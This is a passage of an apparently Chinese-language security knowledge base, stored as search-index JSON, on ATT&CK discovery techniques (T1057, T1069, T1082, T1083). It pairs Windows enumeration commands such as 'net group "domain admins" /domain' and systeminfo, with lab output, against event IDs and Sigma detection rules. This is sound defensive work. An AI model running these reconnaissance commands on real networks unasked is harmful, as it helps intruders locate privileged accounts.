API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u5982Windows management Instrumentation\u548cPowerShell\uff09\u83b7\u53d6\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1057-win-%E8%BF%9B%E7%A8%8B%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1057</p> <p>https://attack.mitre.org/techniques/T1057/</p> <p>MITRE-ATT&amp;CK-T1063</p> <p>https://attack.mitre.org/techniques/T1063/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/","title":"T1069-001-win-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u672c\u5730\u7cfb\u7edf\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002\u672c\u5730\u7cfb\u7edf\u6743\u9650\u7ec4\u7684\u77e5\u8bc6\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u5b58\u5728\u54ea\u4e9b\u7ec4\u4ee5\u53ca\u54ea\u4e9b\u7528\u6237\u5c5e\u4e8e\u7279\u5b9a\u7ec4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u6765\u786e\u5b9a\u54ea\u4e9b\u7528\u6237\u5177\u6709\u8f83\u9ad8\u7684\u6743\u9650\uff0c\u4f8b\u5982\u5728\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d\u627e\u5230\u7684\u7528\u6237\u3002</p> <p>Net\u5b9e\u7528\u7a0b\u5e8f\uff0cmacOS\u548cLinux\u4e0a\u7684\u8bf8\u5982Net\u5b9e\u7528\u7a0b\u5e8fnet localgroup\u4e4b\u7c7b\u7684\u547d\u4ee4\u90fd\u53ef\u4ee5\u5217\u51fa\u672c\u5730\u7ec4\u3002dscl . -list /Groupsgroups</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5728\u4fa6\u5bdf\u9636\u6bb5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u6b63\u5904\u4e8e\u6b64\u9636\u6bb5\uff0c\u5219\u610f\u5473\u7740\u5df2\u7ecf\u7ed5\u8fc7\u4e86\u6240\u6709\u5916\u56f4\u8bbe\u5907\u548c\u5b89\u5168\u9632\u62a4\u9636\u6bb5\u3002Microsoft Net.exe\u7a0b\u5e8f\u53ef\u7528\u4e8e\u679a\u4e3e\u672c\u5730\u548c\u57df\u7528\u6237\u548c\u7ec4\u3002\u5bf9\u4e8e\u4efb\u4f55\u8bd5\u56fe\u83b7\u53d6\u8c01/\u4f55\u5904\u7b49\u7b49\u7b54\u6848\u7684\u653b\u51fb\u8005\uff0c\u8fd9\u90fd\u662f\u5fc5\u987b\u8981\u505a\u7684\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7Net\u547d\u4ee4\u679a\u4e3e\u57df\u548c\u672c\u5730\u7528\u6237\u8d26\u6237\u53ca\u7ba1\u7406\u7ec4\u7b49\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>windows DOS\u547d\u4ee4\uff1anet user / net localgroup administrators</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windwos \u5b89\u5168\u65e5\u5fd7 4799/4798(\u6ce8\u610f\uff1a\u6b64\u4e8b\u4ef6\u65e5\u5fd7\u4ec5\u9650\u4e8ewindows server 2016/win10\u4ee5\u4e0a\u7248\u672c)</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4b\u672c\u5730\u679a\u4e3e\u7528\u6237\u7ec4\u884c\u4e3a\ndescription: windows server 2016\nreferences:\ntags: T1069-001\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n          - 4798 #\u5df2\u679a\u4e3e\u7528\u6237\u7684\u672c\u5730\u7ec4\u6210\u5458\u8eab\u4efd\u3002\u6d4b\u8bd5\u547d\u4ee4\uff1anet user\n          - 4799 #\u5df2\u679a\u4e3e\u542f\u7528\u4e86\u5b89\u5168\u673a\u5236\u7684\u672c\u5730\u7ec4\u6210\u5458\u8eab\u4efd\u3002 \u6d4b\u8bd5\u547d\u4ee4\uff1anet localgroup administrators\n        Processname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f\uff1a\u8fdb\u7a0b\u540d\u79f0\n    condition: selection\nlevel: medium\n</code></pre> <pre><code>title: \u653b\u51fb\u8005\u8fdb\u884c\u672c\u5730\u4fe1\u606f\u6536\u96c6\uff0c\u6267\u884cwhoami\u547d\u4ee4\u4ee5\u53canet user \u547d\u4ee4\ndescription: windows server 2012\nstatus: experimental\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\n        Newprocessname: '*\\whoami.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: whoami #\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection2:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\n        Newprocessname: '*\\net.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: net user #\u8fdb\u7a0b\u547d\u4ee4\u884c\n    selection3:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\n        Newprocessname: '*\\net1.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: '*\\net1  user' #\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection1 or  (selection2 and selection3)\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1069-001</p> <p>https://attack.mitre.org/techniques/T1069/001/</p> <p>MITRE-ATT&amp;CK-T1087</p> <p>https://attack.mitre.org/techniques/T1087/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/","title":"T1069-002-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u57df\u7ea7\u522b\u7684\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002\u57df\u7ea7\u522b\u6743\u9650\u7ec4\u7684\u77e5\u8bc6\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u5b58\u5728\u54ea\u4e9b\u7ec4\u4ee5\u53ca\u54ea\u4e9b\u7528\u6237\u5c5e\u4e8e\u7279\u5b9a\u7ec4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u6765\u786e\u5b9a\u54ea\u4e9b\u7528\u6237\u5177\u6709\u63d0\u5347\u7684\u6743\u9650\uff0c\u4f8b\u5982\u57df\u7ba1\u7406\u5458\u3002</p> <p>Net\u5b9e\u7528\u7a0b\u5e8f\uff0cmacOS\u548cLinux\u4e0a\u7684\u8bf8\u5982Net\u5b9e\u7528\u7a0b\u5e8fnet group /domain\u4e4b\u7c7b\u7684\u547d\u4ee4\u90fd\u53ef\u4ee5\u5217\u51fa\u57df\u7ea7\u522b\u7684\u7ec4\u3002dscacheutil -q groupldapsearch</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5728\u4fa6\u5bdf\u9636\u6bb5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u6b63\u5904\u4e8e\u6b64\u9636\u6bb5\uff0c\u5219\u610f\u5473\u7740\u5df2\u7ecf\u7ed5\u8fc7\u4e86\u6240\u6709\u5916\u56f4\u8bbe\u5907\u548c\u5b89\u5168\u9632\u62a4\u9636\u6bb5\u3002Microsoft Net.exe\u7a0b\u5e8f\u53ef\u7528\u4e8e\u679a\u4e3e\u672c\u5730\u548c\u57df\u7528\u6237\u548c\u7ec4\u3002\u5bf9\u4e8e\u4efb\u4f55\u8bd5\u56fe\u83b7\u53d6\u8c01/\u4f55\u5904\u7b49\u7b49\u7b54\u6848\u7684\u653b\u51fb\u8005\uff0c\u8fd9\u90fd\u662f\u5fc5\u987b\u8981\u505a\u7684\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7Net\u547d\u4ee4\u679a\u4e3e\u57df\u548c\u672c\u5730\u7528\u6237\u8d26\u6237\u53ca\u7ba1\u7406\u7ec4\u7b49\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u4ee5\u4e0b\u573a\u666f\u68c0\u6d4b\u65e5\u5fd7\u9700\u8981\u4ece\u57df\u63a7\u4e3b\u673a\u63d0\u53d6\u3002\u5176\u4ed6\u4e3b\u673a\u65e0\u6b64\u65e5\u5fd7\u4ea7\u751f\uff09</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#net-user-administrator-domain","title":"\u573a\u666f\u4e00\uff1a\u57df\u5185\u4e3b\u673a\u6267\u884cnet user administrator /domain","text":"<pre><code>C:\\Users\\sqladmin&gt;net user administrator /domain\n\u8fd9\u9879\u8bf7\u6c42\u5c06\u5728\u57df 0day.org \u7684\u57df\u63a7\u5236\u5668\u5904\u7406\u3002\n\n\u7528\u6237\u540d                 Administrator\n\u5168\u540d                   Administrator\n\u6ce8\u91ca                   \u7ba1\u7406\u8ba1\u7b97\u673a(\u57df)\u7684\u5185\u7f6e\u5e10\u6237\n\u7528\u6237\u7684\u6ce8\u91ca\n\u56fd\u5bb6/\u5730\u533a\u4ee3\u7801          000 (\u7cfb\u7edf\u9ed8\u8ba4\u503c)\n\u5e10\u6237\u542f\u7528               Yes\n\u5e10\u6237\u5230\u671f               \u4ece\u4e0d\n\n\u4e0a\u6b21\u8bbe\u7f6e\u5bc6\u7801           2019/9/17 18:01:24\n\u5bc6\u7801\u5230\u671f               2019/10/29 18:01:24\n\u5bc6\u7801\u53ef\u66f4\u6539             2019/9/18 18:01:24\n\u9700\u8981\u5bc6\u7801               Yes\n\u7528\u6237\u53ef\u4ee5\u66f4\u6539\u5bc6\u7801       Yes\n\n\u5141\u8bb8\u7684\u5de5\u4f5c\u7ad9           All\n\u767b\u5f55\u811a\u672c\n\u7528\u6237\u914d\u7f6e\u6587\u4ef6\n\u4e3b\u76ee\u5f55\n\u4e0a\u6b21\u767b\u5f55               2019/10/17 14:19:03\n\n\u53ef\u5141\u8bb8\u7684\u767b\u5f55\u5c0f\u65f6\u6570     All\n\n\u672c\u5730\u7ec4\u6210\u5458             *Administrators\n\u5168\u5c40\u7ec4\u6210\u5458             *Organization Manageme*Domain Users\n                       *Enterprise Admins    *Schema Admins\n                       *Group Policy Creator *Domain Admins\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#net-group-domain-admins-domain","title":"\u573a\u666f\u4e8c\uff1a\u57df\u5185\u4e3b\u673a\u6267\u884cnet group \"domain admins\" /domain","text":"<pre><code>C:\\Users\\sqladmin&gt;net group \"domain admins\" /domain\n\u8fd9\u9879\u8bf7\u6c42\u5c06\u5728\u57df 0day.org \u7684\u57df\u63a7\u5236\u5668\u5904\u7406\u3002\n\n\u7ec4\u540d     Domain Admins\n\u6ce8\u91ca     \u6307\u5b9a\u7684\u57df\u7ba1\u7406\u5458\n\n\u6210\u5458\n\n-------------------------------------------------------------------------------\n\nAdministrator            antivirus                backup\nsecretary                sqladmin                 websvr\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c4661\uff08\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\uff09\uff0c\u5bf9\u8c61\u7c7b\u578b\u3001\u8fdb\u7a0b\u4fe1\u606f\u7b49\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: AD\u57df\u6743\u9650\u7ec4\u53ca\u7528\u6237\u679a\u4e3e\ndescription: win7\u6d4b\u8bd5\uff0cwindows service 2008\uff08\u57df\u63a7\uff09\nreferences: http://www.polaris-lab.com/index.php/archives/42/\ntags: T1069-002\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4661  # \u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\n        Objecttype:  #\u5bf9\u8c61&gt;\u5bf9\u8c61\u7c7b\u578b\n             - SAM_USER\n             - SAM_GROUP\n        Objectname: #\u5bf9\u8c61&gt;\u5bf9\u8c61\u540d\n             - 'S-1-5-21-*-*-*-502'\n             - 'S-1-5-21-*-*-*-512'\n             - 'S-1-5-21-*-*-*-500'\n             - 'S-1-5-21-*-*-*-505'\n             - 'S-1-5-21-*-*-*-519'\n             - 'S-1-5-21-*-*-*-520'\n             - 'S-1-5-21-*-*-*-544'\n             - 'S-1-5-21-*-*-*-551'\n             - 'S-1-5-21-*-*-*-555'\n        Processname: 'C:\\Windows\\System32\\lsass.exe' #\u8fdb\u7a0b\u4fe1\u606f&gt;\u8fdb\u7a0b\u540d\u79f0\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_6","title":"\u5efa\u8bae","text":"<p>\u58f0\u660e\uff1a \u4ec5\u6d4b\u8bd5\u4ee5\u4e0b\u547d\u4ee4\uff1anet user administrator /domain\u3001net group \"domain admins\" /domain</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1087\uff1ahttps://attack.mitre.org/techniques/T1087/</p> <p>MITRE-ATT&amp;CK-T1069-002\uff1ahttps://attack.mitre.org/techniques/T1069/002</p> <p>\u5185\u7f51\u6e17\u900f\u5b9a\u4f4d\u6280\u672f\u603b\u7ed3\uff1ahttp://www.polaris-lab.com/index.php/archives/42/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/","title":"T1082-win-\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u7248\u672c\uff0c\u8865\u4e01\uff0c\u4fee\u8865\u7a0b\u5e8f\uff0c\u670d\u52a1\u5305\u548c\u76ee\u5f55\u7ed3\u6784\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7cfb\u7edf\u4fe1\u606f\u4e2d\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u51b3\u5b9a\u540e\u7eed\u7684\u64cd\u4f5c\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u4e86\u76ee\u6807\u6216\u5c1d\u8bd5\u4e86\u7279\u5b9a\u64cd\u4f5c\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#windows","title":"windows","text":"<p>\u83b7\u5f97\u6b64\u4fe1\u606f\u4f8b\u5982\u547d\u4ee4\u548c\u5b9e\u7528\u7a0b\u5e8f\u5305\u62ecver\uff0cSYSTEMINFO\uff0c\u548cdir\u7b49\u7528\u4e8e\u57fa\u4e8e\u672c\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u4fe1\u606f\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>windows\u4e0b\u6d4b\u8bd5systeminfo\u547d\u4ee4</p> <pre><code>Microsoft Windows [\u7248\u672c 6.3.9600]\n(c) 2013 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Users\\Administrator&gt;systeminfo\n\u4e3b\u673a\u540d:           ABCC\nOS \u540d\u79f0:          Microsoft Windows 10 \u4e13\u4e1a\u7248\nOS \u7248\u672c:          10.0.18362 \u6682\u7f3a Build 18362\nOS \u5236\u9020\u5546:        Microsoft Corporation\nOS \u914d\u7f6e:          \u72ec\u7acb\u5de5\u4f5c\u7ad9\nOS \u6784\u4ef6\u7c7b\u578b:      Multiprocessor Free\n\u6ce8\u518c\u7684\u6240\u6709\u4eba:     Windows User\n\u6ce8\u518c\u7684\u7ec4\u7ec7:\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/4688/\u8fdb\u7a0b\u540d\u79f0/\u8fdb\u7a0b\u547d\u4ee4\u884c \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6d4b\u8bd5\u73af\u5883\u4e3awindows server 2012\u9700\u8981\u5f00\u542f\u5ba1\u6838\u7b56\u7565\u624d\u80fd\u591f\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u8fdb\u884c\u5ba1\u8ba1\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u5728windows\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0\ndescription: windows server 2012 \u6d4b\u8bd5\u7ed3\u679c\nreferences: https://github.com/0xpwntester/CB-Threat-Hunting/blob/master/ATT%26CK/T1082-%20systeminfo%20executions.md\ntags: T1082\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\systeminfo.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Tokenpromotiontype: 'TokenElevationTypeDefault (1)'  #\u4ee4\u724c\u63d0\u5347\u7c7b\u578b\n        Processcommandline: 'systeminfo'  #\u8fdb\u7a0b\u547d\u4ee4\u884c\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1082</p> <p>https://attack.mitre.org/techniques/T1082/</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/","title":"T1083-win-\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0","text":""},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u679a\u4e3e\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e3b\u673a\u6216\u7f51\u7edc\u5171\u4eab\u7684\u7279\u5b9a\u4f4d\u7f6e\u641c\u7d22\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u67d0\u4e9b\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u6587\u4ef6\u548c\u76ee\u5f55\u53d1\u73b0\u4e2d\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u548c/\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows \u7528\u4e8e\u83b7\u53d6\u6b64\u4fe1\u606f\u7684\u793a\u4f8b\u5b9e\u7528\u7a0b\u5e8f\u6709dir\u548ctree\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u81ea\u5b9a\u4e49\u5de5\u5177\u6536\u96c6\u6587\u4ef6\u548c\u76ee\u5f55\u4fe1\u606f\uff0c\u5e76\u4e0eWindows API\u4ea4\u4e92\u3002</p> <p>Mac\u548cLinux \u5728Mac\u548cLinux\u4e2d\uff0c\u8fd9\u79cd\u53d1\u73b0\u662f\u901a\u8fc7ls\u3001find\u548clocate\u547d\u4ee4\u5b8c\u6210\u7684\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u8fd9\u91cc\u4e3b\u8981\u6f14\u793awindows\u4e3b\u673a\u4e0b\u6267\u884cdir\u547d\u4ee4\u4ee5\u53catree\u547d\u4ee4\u3002</p>"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1083-win-%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6a21\u62df\u6d4b\u8bd5\uff1awindows server 2016 